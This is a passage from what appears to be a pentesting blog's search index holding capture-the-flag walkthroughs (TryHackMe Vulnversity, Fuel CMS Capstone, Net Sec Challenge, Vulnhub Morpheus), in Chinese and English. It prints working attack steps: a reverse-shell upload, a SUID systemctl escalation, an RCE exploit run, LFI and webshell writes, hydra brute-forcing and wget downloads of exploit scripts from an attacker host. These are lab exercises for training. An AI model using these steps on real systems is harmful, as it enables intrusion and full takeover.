[Size: 326] [--\u003e http://10.10.189.32:3333/internal/css/] Progress: 10838 / 87665 (12.36%)^C [!] Keyboard interrupt detected, terminating. Progress: 10856 / 87665 (12.38%) =============================================================== Finished =============================================================== 在internal目录下存在upload路径。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:2:1","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"Compromise the Webserver ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:3:0","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What common file type you’d want to upload to exploit the server is blocked? Try a couple to find out. 确认被禁止上传的文件类型，一般情况下是可运行的代码文件或者可执行文件，这里测试出来是php文件 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:3:1","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"Run this attack, what extension is allowed? 对可上传文件类型进行fuzz，使用burp，替换php后缀： 这里我只改了php这三个字符，没有加前面的.号。在测试时发现，如果针对.php进行fuzz，fuzz过程中会把.转换为%2e，导致fuzz出错，就没有再去改。 修改方法是在payloads里设置一下最下面的编码： 去掉选项或者去掉.号。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:3:2","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What is the name of the user who manages the webserver? 本地监听，访问反弹shell的php文件http://[ip]:3333/internal/uploads/php_reverse_shell.phtml: ┌──(v4ler1an㉿kali)-[~/Documents/tools] └─$ sudo nc -lvvp 4444 listening on [any] 4444 ... connect to [10.2.124.22] from localhost [10.10.189.32] 35864 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 21:33:42 up 57 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) 找网站的管理员，看家目录用户即可： $ cd /home $ ls bill ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:3:3","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What is the user flag? $ cd bill $ ls user.txt $cat user.txt 8bd7992fbe8a6ad22a63361004cfcedb ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:3:4","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"Privilege Escalation 提权，利用SUID： $ find / -user root -perm -4000 -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 32944 May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 49584 May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 32944 May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 136808 Jul 4 2017 /usr/bin/sudo -rwsr-xr-x 1 root root 40432 May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 54256 May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 23376 Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 39904 May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 75304 May 16 2017 /usr/bin/gpasswd -rwsr-sr-x 1 root root 98440 Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 14864 Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 428240 Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 76408 Jul 17 2019 /usr/lib/squid/pinger -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 38984 Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount -rwsr-xr-x 1 root root 659856 Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 35600 Mar 6 2017 /sbin/mount.cifs 这里使用systemctl，在GtfoBins找到需要执行的命令： TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"id \u003e /tmp/output\" [Install] WantedBy=multi-user.target' \u003e $TF ./systemctl link $TF ./systemctl enable --now $TF 依次输入： $ cd bin $ TF1=$(mktemp).service $ echo '[Service] \u003e Type=oneshot \u003e ExecStart=/bin/sh -c \"chmod +s /bin/bash\" \u003e [Install] \u003e WantedBy=multi-user.target' \u003e $TF1 $ ./systemctl link $TF1 Created symlink from /etc/systemd/system/tmp.uQywY2kLc2.service to /tmp/tmp.uQywY2kLc2.service. $ ./systemctl enable --now $TF1 Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.uQywY2kLc2.service to /tmp/tmp.uQywY2kLc2.service. $ cat /tmp/output uid=0(root) gid=0(root) groups=0(root) 查看flag： ┌──(v4ler1an㉿kali)-[~/Documents/tools/nessus] └─$ sudo nc -lvvp 4444 [sudo] password for v4ler1an: listening on [any] 4444 ... connect to [10.2.124.22] from localhost [10.10.189.32] 35874 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 21:56:29 up 1:20, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ TF1=$(mktemp).service $ echo '[Service] \u003e Type=oneshot \u003e ExecStart=/bin/sh -c \"chmod +s /bin/bash\" \u003e [Install] \u003e WantedBy=multi-user.target' \u003e $TF1 $ /bin/systemctl link $TF1 Created symlink from /etc/systemd/system/tmp.EKpuGvy4Ae.service to /tmp/tmp.EKpuGvy4Ae.service. $ /bin/systemctl enable --now $TF1 Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.EKpuGvy4Ae.service to /tmp/tmp.EKpuGvy4Ae.service. $ /bin/bash -p whoami root cat /root/root.txt a58ff8579f0a9270368d33a9966c7fd5 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:4:0","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-01","objectID":"/2024/01/thm-vulnerability_capstone/","tags":["THM"],"title":"TryHackMe -- Vulnerability Caspstone","uri":"/2024/01/thm-vulnerability_capstone/"},{"categories":["Pentesting"],"content":"THM – Vulnerability Caspstone ","date":"2024-01-01","objectID":"/2024/01/thm-vulnerability_capstone/:0:0","tags":["THM"],"title":"TryHackMe -- Vulnerability Caspstone","uri":"/2024/01/thm-vulnerability_capstone/"},{"categories":["Pentesting"],"content":"What is the name of the application running on the vulnerable machine? 先扫一下常规端口： ┌──(v4ler1an㉿kali)-[~] └─$ sudo nmap -sV -T4 -Pn 10.10.217.113 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 01:33 EST Nmap scan report for localhost (10.10.217.113) Host is up (0.36s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.22 seconds 80端口和22端口，先看80端口： ┌──(v4ler1an㉿kali)-[~] └─$ sudo nmap --script=http-headers -p80 10.10.217.113 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 01:35 EST Nmap scan report for localhost (10.10.217.113) Host is up (0.43s latency). PORT STATE SERVICE 80/tcp open http | http-headers: | Date: Tue, 05 Mar 2024 06:35:42 GMT | Server: Apache/2.4.41 (Ubuntu) | Connection: close | Content-Type: text/html; charset=UTF-8 | |_ (Request type: HEAD) Nmap done: 1 IP address (1 host up) scanned in 2.82 seconds 运行的Apache服务，直接访问： ┌──(v4ler1an㉿kali)-[~] └─$ curl http://10.10.217.113 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en-US\"\u003e \u003chead\u003e ... ... \u003ch1\u003eWelcome to Fuel CMS\u003c/h1\u003e \u003ch2\u003eVersion 1.4\u003c/h2\u003e ... ... 运行的是Fuel CMS，版本为1.4。 ","date":"2024-01-01","objectID":"/2024/01/thm-vulnerability_capstone/:1:0","tags":["THM"],"title":"TryHackMe -- Vulnerability Caspstone","uri":"/2024/01/thm-vulnerability_capstone/"},{"categories":["Pentesting"],"content":"What is the version number of this application? 1.4 ","date":"2024-01-01","objectID":"/2024/01/thm-vulnerability_capstone/:2:0","tags":["THM"],"title":"TryHackMe -- Vulnerability Caspstone","uri":"/2024/01/thm-vulnerability_capstone/"},{"categories":["Pentesting"],"content":"What is the number of the CVE that allows an attacker to remotely execute code on this application? 直接searchsploit搜一下： ┌──(v4ler1an㉿kali)-[~] └─$ searchsploit fuel |grep 1.4 Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated) | php/webapps/50523.txt fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb Fuel CMS 1.4.1 - Remote Code Execution (3) | php/webapps/50477.py Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated) | php/webapps/48741.txt Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated) | php/webapps/48778.txt ┌──(v4ler1an㉿kali)-[~] └─$ searchsploit -p 47138 Exploit: fuel CMS 1.4.1 - Remote Code Execution (1) URL: https://www.exploit-db.com/exploits/47138 Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py Codes: CVE-2018-16763 Verified: False File Type: Python script, ASCII text executable ┌──(v4ler1an㉿kali)-[~] └─$ searchsploit -p 49487 Exploit: Fuel CMS 1.4.1 - Remote Code Execution (2) URL: https://www.exploit-db.com/exploits/49487 Path: /usr/share/exploitdb/exploits/php/webapps/49487.rb Codes: CVE-2018-16763 Verified: False File Type: Ruby script, ASCII text ┌──(v4ler1an㉿kali)-[~] └─$ searchsploit -p 50477 Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3) URL: https://www.exploit-db.com/exploits/50477 Path: /usr/share/exploitdb/exploits/php/webapps/50477.py Codes: CVE-2018-16763 Verified: False File Type: Python script, ASCII text executable 看来是CVE-2018-16763。 ","date":"2024-01-01","objectID":"/2024/01/thm-vulnerability_capstone/:3:0","tags":["THM"],"title":"TryHackMe -- Vulnerability Caspstone","uri":"/2024/01/thm-vulnerability_capstone/"},{"categories":["Pentesting"],"content":"What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine. 直接利用上面搜到的exp： ┌──(v4ler1an㉿kali)-[~] └─$ python3 /usr/share/exploitdb/exploits/php/webapps/50477.py --help usage: python3 /usr/share/exploitdb/exploits/php/webapps/50477.py -u \u003curl\u003e fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit options: -h, --help show this help message and exit -v, --version show the version of exploit -u url, --url url Enter the url EXAMPLE - python3 /usr/share/exploitdb/exploits/php/webapps/50477.py -u http://10.10.21.74 ┌──(v4ler1an㉿kali)-[~] └─$ python3 /usr/share/exploitdb/exploits/php/webapps/50477.py -u http://10.10.217.113/ [+]Connecting... Enter Command $id system Enter Command $cd / system Enter Command $ls system 执行成功了，但是回显有点问题，跟练习本身无关，不管了。换官方的攻击环境成功拿到flag。 ","date":"2024-01-01","objectID":"/2024/01/thm-vulnerability_capstone/:4:0","tags":["THM"],"title":"TryHackMe -- Vulnerability Caspstone","uri":"/2024/01/thm-vulnerability_capstone/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"TryHackMe – Net Sec Challenge THM - Net Sec Challenge ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:0:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"What is the highest port number being open less than 10,000? 指定端口范围扫描 sudo nmap -T4 -p1-10000 -vv [IP] ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:1:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"There is an open port outside the common 1000 ports; it is above 10,000. What is it? 全端口扫描 sudo nmap -vv -T4 -p- [IP] ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:2:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"How many TCP ports are open? 全端口扫描，统计TCP协议的端口，总计6个。 ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:3:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"What is the flag hidden in the HTTP server header? 使用nmap脚本http-headers: ┌──(v4ler1an㉿kali)-[~] └─$ sudo nmap --script-help=http-headers [sudo] password for v4ler1an: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 21:56 EST http-headers Categories: discovery safe https://nmap.org/nsedoc/scripts/http-headers.html Performs a HEAD request for the root folder (\"/\") of a web server and displays the HTTP headers returned. 本质上跟curl的请求差不多。 ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:4:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"What is the flag hidden in the SSH server header? 服务识别，或者使用telnet查看返回信息。 sudo nmap -sV -p22 [IP] ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:5:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"We have an FTP server listening on a nonstandard port. What is the version of the FTP server? 非常规端口，服务识别，10021端口： sudo nmap -sV -p10021 [IP] ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:6:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP? 有用户名，需要登陆访问ftp获取文件，所以需要爆破密码。 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt frp://[IP]:[PORT] 登陆然后查看文件，获得flag。 ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:7:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"Browsing to http://10.10.208.24:8080 displays a small challenge that will give you a flag once you solve it. What is the flag? 访问: 大意就是使用nmap扫描，但是不要被IDS检查出来。直接用-sN选项即可。-sN选项是隐蔽扫描，通过构造特殊标记来绕过一些IDS： sudo nmap -sN [IP] ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:8:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Pentesting"],"content":"总结 基本原则：减少扫描次数 扫描端口范围 -\u003e 针对特定端口扫描 -\u003e 指定特定脚本 隐蔽扫描：-sN -sF -sX ","date":"2024-01-01","objectID":"/2024/01/thm-net_sec_challenge/:9:0","tags":["THM"],"title":"TryHackMe -- Net Sec Challenge","uri":"/2024/01/thm-net_sec_challenge/"},{"categories":["Web"],"content":"Vulnhub Training -- Matrix-breakout-2-Morpheus","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"Vulnhub Training Walkthrough – Matrix-breakout-2-Morpheus ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:0:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"Knowledge LFI – Local File Include LinPEAS – Dirty-Pipe CVE-2022-0847 php://filter ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:1:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"1. Environment Setup Download the OVA file, import into VMware and just run. ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:2:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:3:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"1. IP Address arp-scan scanner: ┌──(v4ler1an㉿kali)-[~] └─$ sudo arp-scan -l [sudo] password for v4ler1an: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec (Unknown) 172.16.86.153 00:0c:29:f6:3b:cd (Unknown) 172.16.86.254 00:50:56:ed:8a:52 (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded Target IP is 172.16.86.152. ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:3:1","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"2. Port Info Scan the port and service: ┌──(v4ler1an㉿kali)-[~] └─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST Nmap scan report for 172.16.86.153 Host is up (0.00033s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: |_ 256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA) 80/tcp open http Apache httpd 2.4.51 ((Debian)) |_http-server-header: Apache/2.4.51 (Debian) |_http-title: Morpheus:1 81/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Meeting Place |_http-title: 401 Authorization Required Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds Port and service: port service 22 ssh 80 Apache httpd 2.4.51 81 nginx 1.18.0 Access the 80 webpage: The source of page is: \u003chtml\u003e \u003chead\u003e\u003ctitle\u003eMorpheus:1\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e Welcome to the Boot2Root CTF, Morpheus:1. \u003cp\u003e You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh. \u003cp\u003e Good luck! - @jaybeale from @inguardians \u003cp\u003e \u003cimg src=\"trinity.jpeg\"\u003e \u003c/body\u003e \u003c/html\u003e The picture is normal. Access the 81 port: Has a login page, but we have no name and password. The username maybe is Trinity or Cypher. ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:3:2","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"3. Web Directory Scan the web directory: ┌──(v4ler1an㉿kali)-[~] └─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,txt,html -t 60 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.153 [+] Method: GET [+] Threads: 60 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,bak,txt,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 278] /index.html (Status: 200) [Size: 348] /.html (Status: 403) [Size: 278] /javascript (Status: 301) [Size: 319] [--\u003e http://172.16.86.153/javascript/] /robots.txt (Status: 200) [Size: 47] /graffiti.txt (Status: 200) [Size: 139] /graffiti.php (Status: 200) [Size: 451] /.html (Status: 403) [Size: 278] /.php (Status: 403) [Size: 278] /server-status (Status: 403) [Size: 278] Progress: 1102800 / 1102805 (100.00%) =============================================================== Finished =============================================================== We can find robots.txt, graffiti.txt and graffiti.php file, just look at it. ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.153/robots.txt There's no white rabbit here. Keep searching! ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.153/graffiti.txt Mouse here - welcome to the Nebby! Make sure not to tell Morpheus about this graffiti wall. It's just here to let us blow off some steam. We found a message input box. ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:3:3","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"3. Exploit Now, let’s test graffiti.php with burp: As we can see, when we text in message box, the server will return the graffiti.txt file, and what we input in message box will be accour here. So, here has a LFI vulnerability. ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:4:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"1. LFI We can check out the graffiti.php source code with php:filter through the LFI: Decode with base64 and then got the source code: \u003c?php $file=\"graffiti.txt\"; if($_SERVER['REQUEST_METHOD'] == 'POST') { if (isset($_POST['file'])) { $file=$_POST['file']; } if (isset($_POST['message'])) { $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file); fwrite($handle, $_POST['message']); fwrite($handle, \"\\n\"); fclose($file); } } // Display file $handle = fopen($file,\"r\"); while (!feof($handle)) { echo fgets($handle); echo \"\u003cbr\u003e\\n\"; } fclose($handle); ?\u003e We fill the file parameter with php://filter/read=convert.base64-encode/resource=graffiti.php, and we got the source code of graffiti.php. ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:4:1","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"2. Upload the webshell In the source code of graffiti.php, we can find that the $file variable with replaced with the POST’s parameter file, and then write the message we inputed into the file. So, we can use it write a webshell here: And then connect it with AntSword: ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:4:2","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"3. Get the reverse shell And then we user a php reverse shell to get shell: And then switch the shell by python: $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; www-data@morpheus:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@morpheus:/$ ls ls FLAG.txt boot dev home lib32 libx32 media opt root sbin sys usr bin crew etc lib lib64 lost+found mnt proc run srv tmp var www-data@morpheus:/$ cat FLAG.txt cat FLAG.txt Flag 1! You've gotten onto the system. Now why has Cypher locked everyone out of it? Can you find a way to get Cypher's password? It seems like he gave it to Agent Smith, so Smith could figure out where to meet him. Also, pull this image from the webserver on port 80 to get a flag. /.cypher-neo.png ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:4:3","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"4. Privilege Escalation Now, we need to get root. We can find two user in home: www-data@morpheus:/$ ls /home ls /home cypher trinity www-data@morpheus:/$ find / -user cypher -type f 2\u003e/dev/null find / -user cypher -type f 2\u003e/dev/null /FLAG.txt www-data@morpheus:/$ find / -user trinity -type f 2\u003e/dev/null find / -user trinity -type f 2\u003e/dev/null /home/trinity/.bash_logout /home/trinity/.bashrc /home/trinity/.profile Nothing useful. Let’s use LinPEAS: www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh wget http://172.16.86.138:8080/LinPEAS.sh --2023-11-15 06:35:55-- http://172.16.86.138:8080/LinPEAS.sh Connecting to 172.16.86.138:8080... connected. HTTP request sent, awaiting response... 200 OK Length: 847815 (828K) [text/x-sh] Saving to: ‘LinPEAS.sh’ LinPEAS.sh 100%[===================\u003e] 827.94K --.-KB/s in 0.04s 2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815] www-data@morpheus:/var/www/html$ ls ls LinPEAS.sh graffiti.txt php_reverse_shell.php shell.php graffiti.php index.html robots.txt trinity.jpeg www-data@morpheus:/var/www/html$ ls -la ls -la total 1284 drwxr-xr-x 2 www-data www-data 4096 Nov 15 06:35 . drwxr-xr-x 3 root root 4096 Oct 28 2021 .. -rw-r--r-- 1 www-data www-data 381359 Oct 28 2021 .cypher-neo.png -rw-rw-rw- 1 www-data www-data 847815 Nov 15 2023 LinPEAS.sh -rw-r--r-- 1 www-data www-data 778 Nov 15 05:34 graffiti.php -rw-r--r-- 1 www-data www-data 181 Nov 15 05:29 graffiti.txt -rw-r--r-- 1 www-data www-data 348 Oct 28 2021 index.html -rw-r--r-- 1 www-data www-data 5495 Nov 15 2023 php_reverse_shell.php -rw-r--r-- 1 www-data www-data 47 Oct 28 2021 robots.txt -rw-r--r-- 1 www-data www-data 31 Nov 15 05:41 shell.php -rw-r--r-- 1 www-data www-data 44297 Oct 28 2021 trinity.jpeg www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh chmod +x LinPEAS.sh We can find something useful: We can use Dirty-Pipe to get root. The exploit. Download it and then execute: www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh wget http://172.16.86.138:8080/dirty_pipe.sh --2023-11-15 06:47:08-- http://172.16.86.138:8080/dirty_pipe.sh Connecting to 172.16.86.138:8080... connected. HTTP request sent, awaiting response... 200 OK Length: 4855 (4.7K) [text/x-sh] Saving to: ‘dirty_pipe.sh’ dirty_pipe.sh 100%[===================\u003e] 4.74K --.-KB/s in 0s 2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855] www-data@morpheus:/var/www/html$ ls -la ls -la total 1292 drwxr-xr-x 2 www-data www-data 4096 Nov 15 06:47 . drwxr-xr-x 3 root root 4096 Oct 28 2021 .. -rw-r--r-- 1 www-data www-data 381359 Oct 28 2021 .cypher-neo.png -rwxrwxrwx 1 www-data www-data 847815 Nov 15 2023 LinPEAS.sh -rw-rw-rw- 1 www-data www-data 4855 Nov 15 03:32 dirty_pipe.sh -rw-r--r-- 1 www-data www-data 778 Nov 15 05:34 graffiti.php -rw-r--r-- 1 www-data www-data 181 Nov 15 05:29 graffiti.txt -rw-r--r-- 1 www-data www-data 348 Oct 28 2021 index.html -rw-r--r-- 1 www-data www-data 5495 Nov 15 2023 php_reverse_shell.php -rw-r--r-- 1 www-data www-data 47 Oct 28 2021 robots.txt -rw-r--r-- 1 